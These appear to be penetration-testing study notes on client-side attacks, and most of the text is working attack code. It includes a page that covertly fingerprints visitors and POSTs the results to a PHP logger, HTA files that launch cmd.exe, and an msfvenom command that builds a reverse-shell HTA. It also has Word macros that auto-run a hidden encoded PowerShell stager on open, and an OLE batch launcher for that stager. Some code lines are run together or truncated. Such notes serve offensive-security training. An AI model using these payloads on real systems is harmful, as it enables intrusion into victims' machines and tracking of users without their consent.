
# Client Side Attack

### Install Fingerprintjs2 JavaScript library

```
kali@kali:/var/www/html$ sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip

kali@kali:/var/www/html$ sudo unzip master.zip

kali@kali:/var/www/html$ sudo mv fingerprintjs2-master/ fp

```

### Index.html

```
kali@kali:/var/www/html/fp$ cat index.html <!doctype html>
<html>
<head>
<title>Fingerprintjs2 test</title> </head>
<body> <h1>Fingerprintjs2</h1>
<p>Your browser fingerprint: <strong id="fp"></strong></p> <p><code id="time"/></p>
<p><span id="details"/></p>
<script src="fingerprint2.js"></script>
<script>
var d1 = new Date();
var options = {};
Fingerprint2.get(options, function (components) {
var values = components.map(function (component) { return component.value }) var murmur = Fingerprint2.x64hash128(values.join(''), 31)
var d2 = new Date();
var timeString = "Time to calculate the fingerprint: " + (d2 - d1) + "ms"; var details = "<strong>Detailed information: </strong><br />";
if(typeof window.console !== "undefined") {
for (var index in components) { var obj = components[index]; var value = obj.value;
if (value !== null) {
var line = obj.key + " = " + value.toString().substr(0, 150); details += line + "<br />";
}
}
}
document.querySelector("#details").innerHTML = details document.querySelector("#fp").textContent = murmur document.querySelector("#time").textContent = timeString
      });
  </script>
</body>
</html>
```

### Updated fp collection script

```
<!doctype html>
<html>
<head>
<title>Blank Page</title> </head>
<body>
<h1>You have been given the finger!</h1> <script src="fingerprint2.js"></script> <script>
var d1 = new Date();
var options = {};
Fingerprint2.get(options, function (components) {
var values = components.map(function (component) { return component.value }) var murmur = Fingerprint2.x64hash128(values.join(''), 31)
var clientfp = "Client browser fingerprint: " + murmur + "\n\n";
var d2 = new Date();
var timeString = "Time to calculate fingerprint: " + (d2 - d1) + "ms\n\n";
var details = "Detailed information: \n"; if(typeof window.console !== "undefined") {
for (var index in components) { var obj = components[index]; var value = obj.value;
if (value !== null) {
var line = obj.key + " = " + value.toString().substr(0, 150); details += line + "\n";
}
} }
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", "/fp/js.php"); xmlhttp.setRequestHeader("Content-Type", "application/txt"); xmlhttp.send(clientfp + timeString + details);
      });
  </script>
</body>
</html>
```


### Content of /fp/js.php

```
<?php
$data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
$data .= file_get_contents('php://input');
$data .= "---------------------------------\n\n"; file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true), FILE_APPEND | LOCK_EX);
?>
```

### Update permission

```
kali@kali:/var/www/html$ sudo chown www-data:www-data fp
```

### Exploring HTML Application

poc.hta

```
<html>
<body>
<script>
var c= 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
Updated File

```
<html>
<body>
<script>
var c= 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

### Shell Code Generation
```
kali@kali:~$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```

### Microsoft Word Macro

#### Macro opening cmd.exe

```
Sub MyMacro() 
CreateObject("Wscript.Shell").Run "cmd"
End Sub
```
Since Office macros are not executed automatically, we must make use of two predefined procedures, namely the AutoOpen procedure, which is executed when a new document is opened and the Document_Open355 procedure, which is executed when an already-open document is re- opened. Both of these procedures can call our custom procedure and therefore run our code.

```
Sub AutoOpen() 
 MyMacro
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub MyMacro() 
 CreateObject("Wscript.Shell").Run "cmd"
End Sub
```

#### Macro with shell code

```
Sub AutoOpen() MyMacro
End Sub
Sub Document_Open() MyMacro
End Sub
Sub MyMacro()
Dim Str As String
Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB" Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A" Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg" Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY" Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB" ...
Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac" Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB" Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA" Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA" Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK" Str = Str + "QA="
CreateObject("Wscript.Shell").Run Str End Sub
```
### MS Document Abuse

we can still leverage Object Linking and Embedding (OLE)360 to abuse Microsoft Office’s document-embedding feature

content of launch.bat
```
START cmd.exe
```

Replace cmd.exe with shell code

```
START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
```

Bypass protected view using Microsoft Publisher



